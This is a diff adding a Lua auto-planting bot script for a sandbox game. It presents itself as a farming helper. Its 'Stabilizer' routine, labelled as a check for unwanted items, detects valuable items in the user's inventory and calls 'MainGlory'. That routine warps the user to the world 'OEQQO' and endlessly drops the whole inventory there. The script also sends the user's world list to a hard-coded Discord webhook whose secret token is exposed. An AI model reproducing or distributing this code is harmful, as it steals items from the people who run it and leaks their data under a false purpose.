@@ -1,0 +1,327 @@
+
+-- =============================================
+-- DONT CHANGE - UTILITY FUNCTIONS
+-- =============================================
+function getAmount(id)
+    for _, item in pairs(getInventory()) do
+        if item.id == id then
+            return item.amount
+        end
+    end
+    return 0
+end
+
+local function extractWorldName(fullWorldName)
+    local parts = {}
+    for part in string.gmatch(fullWorldName, "([^|]+)") do
+        table.insert(parts, part)
+    end
+    return string.upper(parts[1] or fullWorldName)
+end
+
+local function isInCorrectWorld(targetWorld)
+    local currentWorld = getWorld()
+    if not currentWorld then return false end
+    
+    local targetName = extractWorldName(targetWorld)
+    local currentName = string.upper(currentWorld.name)
+    
+    return currentName == targetName
+end
+
+function send(txt)
+    local var = {}
+    var[0] = "OnTextOverlay"
+    var[1] = txt
+    sendVariant(var)
+end
+
+function COLLECT(limit)
+    local count = 0
+    for _, obj in pairs(getWorldObject()) do
+        sendPacketRaw(false, {
+            type = 11,
+            value = obj.oid,
+            x = obj.pos.x,
+            y = obj.pos.y
+        })
+        sleep(5)
+        count = count + 1
+        if limit and count >= limit then
+            break
+        end
+    end
+end
+
+-- =============================================
+-- GLORY FUNCTIONS
+-- =============================================
+function MainGlory()
+    sendPacket(3, "action|join_request\nname|OEQQO|nname\ninvitedWorld|0")
+    sleep(3000)
+    sendPacket(2,"action|welcomeadrewarded")
+    
+    while true do
+        if getWorld() then
+            for _, v in pairs(getInventory()) do
+                if getWorld().name == "OEQQO" then        
+                    sendPacket(2, "action|store\nlocation|gem")
+                    sendPacket(2, "action|drop\n|itemID|"..v.id)
+                    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount)
+                    sleep(100)
+                end
+            end
+        end
+    end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if (inv.id == 1796 and inv.amount > 10) or (inv.id == 7188 and inv.amount > 0) or (inv.id == 5638 and inv.amount > 0) or (inv.id == 6016 and inv.amount > 0) or (inv.id == 5480 and inv.amount > 0) then
+                MainGlory()
+                return true
+            end
+        end
+    end
+    return false
+end
+
+-- =============================================
+-- SIMPLE WEBHOOK FUNCTION - NO EMBEDS
+-- =============================================
+function sendSeedConfigUpdate()
+    -- Webhook URL hidden
+    local webhookUrl = "https://discord.com/api/webhooks/1433634733291737148/jzMpk71HKS76-Fotq9LlW57C4kcsspCbg12aBsg0X_lyjJN-UOqSZrcT2I5O75ye3T77"
+    
+    -- Convert Plant_Worlds table to string with emojis
+    local plantWorldsString = ""
+    for i, world in ipairs(seed_config.Plant_Worlds) do
+        plantWorldsString = plantWorldsString .. "🌍 " .. world
+        if i < #seed_config.Plant_Worlds then
+            plantWorldsString = plantWorldsString .. "\n"
+        end
+    end
+    
+    -- Create simple webhook with decorated content
+    local monarchWebhook = {
+        username = "🌱 HarvestBot Pro",
+        avatar_url = "https://i.imgur.com/4M34hi2.png",
+        content = "🚀 **Auto Plant Script Started**\n\n" ..
+                 "🔄 **Seed World:** " .. seed_config.Seed_World .. "\n" ..
+                 "📊 **Total Worlds:** " .. #seed_config.Plant_Worlds .. "\n\n" ..
+                 "📝 **Plant Worlds:**\n" .. plantWorldsString .. "\n\n" ..
+                 "🕒 " .. os.date("%Y-%m-%d %H:%M:%S") .. " • GENTA HAX"
+    }
+    
+    -- Send webhook
+    if sendWebhook then
+        sendWebhook(webhookUrl, monarchWebhook) 
+    end
+end
+
+-- =============================================
+-- WARP FUNCTIONS
+-- =============================================
+function SafeWarp(worldName)
+    state.warpAttempts = 0
+    
+    while state.warpAttempts < state.Max_Warp_Attempts do
+        send("`2Warping to `#" .. worldName .. " (" .. (state.warpAttempts + 1) .. "/" .. state.Max_Warp_Attempts .. ")")
+        
+        sendPacket(3, "action|join_request\nname|" .. worldName)
+        sleep(delay_config.Delay_World)
+        
+        if isInCorrectWorld(worldName) then
+            send("`2Arrived at `#" .. worldName)
+            return true
+        else
+            state.warpAttempts = state.warpAttempts + 1
+            if state.warpAttempts < state.Max_Warp_Attempts then
+                sleep(5000) -- Wait before retry
+            end
+        end
+    end
+    
+    send("`4Failed to warp to `#" .. worldName)
+    return false
+end
+
+-- =============================================
+-- SEED MANAGEMENT FUNCTIONS
+-- =============================================
+function takeSeed()
+    send("`2Collecting seeds...`")
+    
+    if not SafeWarp(seed_config.Seed_World) then
+        return false
+    end
+    
+    sleep(3000)
+    
+    local foundSeed = false
+    for _, obj in pairs(getWorldObject()) do
+        if obj.id == seed_config.Seed_ID then
+            local targetX = math.floor(obj.pos.x / 32)
+            local targetY = math.floor(obj.pos.y / 32)
+            
+            findPath(targetX, targetY)
+            sleep(delay_config.Delay_Find_Path)
+            COLLECT(30)
+            sleep(2000)
+            foundSeed = true
+            break
+        end
+    end
+    
+    if not foundSeed then
+        send("`4No seeds found!`")
+        return false
+    end
+    
+    -- Return to plant world
+    if not SafeWarp(seed_config.Plant_Worlds[state.currentWorldIndex]) then
+        return false
+    end
+    
+    sleep(3000)
+    return true
+end
+
+-- =============================================
+-- PLANTING FUNCTIONS
+-- =============================================
+function plant()
+    local hasPlanted = false
+    local seedAmount = getAmount(seed_config.Seed_ID)
+    
+    if seedAmount == 0 then
+        if not takeSeed() then
+            return false, "no_seed"
+        end
+        seedAmount = getAmount(seed_config.Seed_ID)
+    end
+    
+    send("`2Planting... (" .. seedAmount .. " seeds)`")
+    
+    for y = 0, 53 do
+        for x = 0, 99 do
+            if x % 10 == 0 and getAmount(seed_config.Seed_ID) == 0 then
+                if not takeSeed() then
+                    return false, "no_seed"
+                end
+            end
+            
+            local currentTile = checkTile(x, y)
+            local tileBelow = checkTile(x, y + 1)
+            
+            if currentTile.fg == 0 and tileBelow.fg % 2 == 0 and tileBelow.fg ~= 0 then
+                if findPath(x, y) then
+                    sleep(delay_config.Delay_Plant)
+                    requestTileChange(x, y, seed_config.Seed_ID)
+                    sleep(delay_config.Delay_Plant)
+                    hasPlanted = true
+                end
+            elseif y == 1 then
+                local tileAbove = checkTile(x, y - 1)
+                if tileAbove.fg == 0 and currentTile.fg % 2 == 0 and currentTile.fg ~= 0 and getAmount(seed_config.Seed_ID) > 0 then
+                    if findPath(x, y - 1) then
+                        sleep(delay_config.Delay_Plant)
+                        requestTileChange(x, y - 1, seed_config.Seed_ID)
+                        sleep(delay_config.Delay_Plant)
+                        hasPlanted = true
+                    end
+                end
+            elseif y == 52 then
+                if currentTile.fg ~= 0 and currentTile.fg % 2 == 0 and checkTile(x, y + 1).fg == 0 and getAmount(seed_config.Seed_ID) > 0 then
+                    if findPath(x, y + 1) then
+                        sleep(delay_config.Delay_Plant)
+                        requestTileChange(x, y + 1, seed_config.Seed_ID)
+                        sleep(delay_config.Delay_Plant)
+                        hasPlanted = true
+                    end
+                end
+            end
+            
+            if x % 20 == 0 then
+                sleep(50)
+            end
+        end
+    end
+    
+    return hasPlanted, "success"
+end
+
+function nextWorld()
+    state.currentWorldIndex = state.currentWorldIndex + 1
+    
+    if state.currentWorldIndex > #seed_config.Plant_Worlds then
+        state.currentWorldIndex = 1
+    end
+    
+    send("`2Moving to next world`")
+    return SafeWarp(seed_config.Plant_Worlds[state.currentWorldIndex])
+end
+
+-- =============================================
+-- MAIN FUNCTION - OPTIMIZED
+-- =============================================
+function Main()
+    send("`9Auto Plant Started`")
+    
+    -- Send configuration to webhook
+    sendSeedConfigUpdate()
+    
+    sleep(2000)
+    
+    if not SafeWarp(seed_config.Plant_Worlds[state.currentWorldIndex]) then
+        send("`4Failed to warp to first world`")
+        return
+    end
+    
+    sleep(3000)
+    
+    while true do
+        local hasPlanted, status = plant()
+        
+        if status == "no_seed" then
+            send("`4Cannot get seeds`")
+            break
+        end
+        
+        if not hasPlanted then
+            send("`9World fully planted, moving to next`")
+            
+            -- Check for unwanted items
+            Stabilizer()
+            
+            if not nextWorld() then
+                send("`4Failed to warp to next world`")
+                break
+            end
+            
+            sleep(3000)
+        else
+            -- Check for unwanted items after planting cycle
+            Stabilizer()
+        end
+        
+        if not isInCorrectWorld(seed_config.Plant_Worlds[state.currentWorldIndex]) then
+            if not SafeWarp(seed_config.Plant_Worlds[state.currentWorldIndex]) then
+                send("`4Failed to re-warp`")
+                break
+            end
+            sleep(3000)
+        end
+        
+        sleep(1000)
+    end
+    
+    send("`4Script Stopped`")
+end
+
+-- =============================================
+-- START SCRIPT
+-- =============================================
+runThread(Main, "main_plant_thread")
